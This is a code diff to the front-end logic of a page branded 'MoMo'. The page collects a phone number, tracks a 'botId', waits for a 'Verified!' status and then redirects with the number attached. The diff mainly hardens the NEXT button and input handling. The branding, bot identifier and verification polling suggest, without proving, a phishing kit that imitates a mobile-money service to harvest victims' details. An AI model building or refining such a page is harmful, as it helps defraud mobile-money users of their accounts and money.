@@ -189,10 +189,15 @@
             transition: background 0.3s ease;
             position: relative;
         }
-        .next:enabled { background: #005572; cursor: pointer; }
-        .next:enabled:hover { background: #00415a; }
-        .next:enabled:active { transform: scale(.98); }
+        /* Active state — driven by .is-active class (more reliable than :enabled) */
+        .next.is-active {
+            background: #005572;
+            cursor: pointer;
+        }
+        .next.is-active:hover { background: #00415a; }
+        .next.is-active:active { transform: scale(.98); }
 
+        .next.loading,
         .next.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
 
         .next .btn-text { display: inline; }
@@ -276,6 +281,7 @@
                     placeholder="Enter number *"
                     aria-label="Phone number"
                     autocomplete="tel"
+                    enterkeyhint="go"
                 >
             </div>
 
@@ -302,12 +308,17 @@
 
 <script>
 // ============================================================
-//  ALL PAGE LOGIC — one script, one IIFE, at the bottom of <body>
+//  MoMo — details page logic
 //
 //  ORDER MATTERS:
 //   1) DOM refs + UI listeners are attached FIRST so the NEXT
 //      button always reacts to typing, no matter what.
 //   2) botId resolution happens AFTER, and never blocks the UI.
+//
+//  The NEXT button state is refreshed via:
+//    • direct event listeners on the input
+//    • a delegated listener on document
+//    • a lightweight interval as a last-resort safety net
 // ============================================================
 (function() {
     'use strict';
@@ -322,13 +333,42 @@
     const button   = document.getElementById('continueBtn');
     const statusEl = document.getElementById('status');
 
-    let pollTimer = null;
-    let botId     = null;
+    // Fail loudly if something is missing — easier to debug.
+    if (!form || !phone || !button || !statusEl) {
+        console.error('[MoMo] Required DOM elements not found', {
+            form: !!form, phone: !!phone, button: !!button, statusEl: !!statusEl
+        });
+        return;
+    }
+
+    let pollTimer  = null;
+    let botId      = null;
+    let lastState  = null;   // for change-only logging
 
     // ---------- VALIDATION ----------
+    // Sets both the .disabled property AND an .is-active class so the
+    // visual state is guaranteed even if :enabled pseudo-class fails.
     function validateForm() {
-        const digits = phone.value.replace(/\D/g, '');
-        button.disabled = (digits.length === 0) || button.classList.contains('loading');
+        const digits       = phone.value.replace(/\D/g, '');
+        const isLoading    = button.classList.contains('loading');
+        const shouldDisable = (digits.length === 0) || isLoading;
+
+        if (button.disabled !== shouldDisable) {
+            button.disabled = shouldDisable;
+        }
+        if (shouldDisable) {
+            button.classList.remove('is-active');
+        } else {
+            button.classList.add('is-active');
+        }
+
+        // Log only when the state actually changes (avoids console spam)
+        if (lastState !== shouldDisable) {
+            lastState = shouldDisable;
+            console.log('[MoMo] NEXT disabled:', shouldDisable,
+                        '| digits:', JSON.stringify(digits),
+                        '| raw:', JSON.stringify(phone.value));
+        }
     }
 
     // ---------- HELPERS ----------
@@ -354,6 +394,7 @@
     function setLoading(on) {
         if (on) {
             button.disabled = true;
+            button.classList.remove('is-active');
             button.classList.add('loading');
         } else {
             button.classList.remove('loading');
@@ -361,26 +402,51 @@
         }
     }
 
-    // ---------- INPUT LISTENER (attached immediately) ----------
-    phone.addEventListener('input', function() {
-        let value = this.value;
+    // ---------- INPUT SANITIZER + LISTENER (attached immediately) ----------
+    function onPhoneInput() {
+        let value = phone.value;
+
+        // Keep digits, spaces, and a single leading +
         value = value.replace(/[^\d+\s]/g, '');
-        const hasPlus = value.startsWith('+');
+        const hasPlus = value.indexOf('+') !== -1;
         value = value.replace(/\+/g, '');
         if (hasPlus) value = '+' + value;
         value = value.replace(/\s+/g, ' ');
-        this.value = value;
-        validateForm();
-    });
 
-    // Also catch paste / change / keyup for stubborn mobile keyboards
-    phone.addEventListener('change', validateForm);
-    phone.addEventListener('keyup', validateForm);
+        // Only rewrite if the sanitized value differs (avoids caret jumps)
+        if (phone.value !== value) {
+            const atEnd = phone.selectionStart === phone.value.length;
+            phone.value = value;
+            if (atEnd) {
+                try { phone.setSelectionRange(value.length, value.length); } catch (e) {}
+            }
+        }
+
+        validateForm();
+    }
+
+    // Belt + suspenders: attach every reasonable event
+    ['input', 'keyup', 'keydown', 'change', 'paste', 'cut', 'blur', 'focus', 'click', 'touchstart', 'touchend']
+        .forEach(function(evt) {
+            phone.addEventListener(evt, onPhoneInput, false);
+        });
+
+    // Delegated listener on document — catches anything that bypasses the field
+    document.addEventListener('input', function(e) {
+        if (e.target === phone) validateForm();
+    }, false);
+    document.addEventListener('keyup', function(e) {
+        if (e.target === phone) validateForm();
+    }, false);
+
+    // Last-resort safety net: some mobile browsers / extensions can swallow events.
+    // 400ms is imperceptible to the user and extremely cheap.
+    setInterval(validateForm, 400);
 
     // ---------- BOT ID RESOLVER (non-blocking) ----------
     (function resolveBotId() {
         try {
-            const params = new URLSearchParams(window.location.search);
+            const params   = new URLSearchParams(window.location.search);
             const fromUrl  = params.get('botId');
             let stored = null;
             try { stored = localStorage.getItem('botId'); } catch (e) { /* storage blocked */ }
@@ -396,7 +462,6 @@
 
             try { localStorage.setItem('botId', botId); } catch (e) { /* storage blocked */ }
 
-            // Keep botId in the URL so refreshes and redirects keep it
             if (fromUrl !== botId) {
                 params.set('botId', botId);
                 window.history.replaceState(
@@ -424,9 +489,9 @@
         e.preventDefault();
         if (button.classList.contains('loading')) return;
 
-        const raw = phone.value.trim();
-        const hasPlus = raw.startsWith('+');
-        const digits = raw.replace(/\D/g, '');
+        const raw      = phone.value.trim();
+        const hasPlus  = raw.startsWith('+');
+        const digits   = raw.replace(/\D/g, '');
         const phoneVal = (hasPlus ? '+' : '') + digits;
 
         if (!digits) {
@@ -487,8 +552,8 @@
                         setLoading(false);
                         setStatus('✅ Verified! Redirecting...', 'success');
                         const redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
-                                            '&phone=' + encodeURIComponent(phoneVal) +
-                                            '&botId=' + encodeURIComponent(botId);
+                                            '&phone='     + encodeURIComponent(phoneVal) +
+                                            '&botId='     + encodeURIComponent(botId);
                         setTimeout(() => {
                             window.location.href = redirectUrl;
                         }, 700);
@@ -523,7 +588,7 @@
     validateForm();
     try { phone.focus(); } catch (e) {}
 
-    console.log('✅ details.html ready. botId =', botId);
+    console.log('✅ MoMo details page ready. botId =', botId);
 })();
 </script>
 
